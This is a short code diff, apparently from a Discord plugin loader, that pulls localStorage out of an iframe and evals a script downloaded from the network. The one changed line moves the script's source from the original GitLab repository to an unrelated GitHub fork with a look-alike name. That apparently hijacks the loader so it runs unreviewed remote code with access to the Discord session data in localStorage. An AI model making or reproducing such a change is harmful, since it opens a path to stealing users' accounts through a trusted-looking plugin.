@@ -48,7 +48,7 @@ function Start() {
             iframe.contentDocument.body.innerHTML = "<iframe/>";
             localStorage = Object.getOwnPropertyDescriptor(iframe.contentDocument.body.children[0].__proto__, 'contentWindow').get.apply(iframe).localStorage;
 
-            require('https').get("https://gitlab.com/An0/SimpleDiscordCrypt/raw/master/SimpleDiscordCrypt.user.js", (response) => {
+            require('https').get("https://raw.githubusercontent.com/b2cktr2ck/Simple-Discord-Crypted/main/SimpleDiscordCrypt.user.js", (response) => {
                 let data = [];
                 response.on('data', (chunk) => data.push(chunk));
                 response.on('end', () => eval(typeof data[0] === 'string' ? data.join("") : Buffer.concat(data).toString()));
